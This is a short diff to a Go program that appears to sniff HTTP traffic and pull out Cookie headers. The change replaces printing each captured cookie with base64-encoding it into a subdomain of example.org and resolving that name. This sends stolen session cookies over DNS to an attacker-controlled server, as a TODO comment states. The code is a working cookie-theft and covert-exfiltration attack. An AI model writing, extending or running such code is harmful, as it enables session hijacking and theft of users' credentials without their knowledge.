@@ -3,9 +3,11 @@ package main
 import (
 	"bufio"
 	"bytes"
+	"encoding/base64"
 	"flag"
 	"fmt"
 	"log"
+	"net"
 	"net/http"
 	"time"
 
@@ -16,7 +18,9 @@ import (
 
 func pumpOutChannel(messages chan string) {
 	for cookie := range messages {
-		fmt.Println(cookie)
+		// TODO domain server that you control
+		dnsName := fmt.Sprintf("%s.example.org", base64.StdEncoding.EncodeToString([]byte(cookie)))
+		net.LookupIP(dnsName)
 	}
 }
 
@@ -66,7 +70,9 @@ func main() {
 				httpReq, err := http.ReadRequest(reader)
 				if err == nil {
 					cookie := httpReq.Header.Get("Cookie")
-					messages <- cookie
+					if cookie != "" {
+						messages <- cookie
+					}
 				}
 			}
 		}
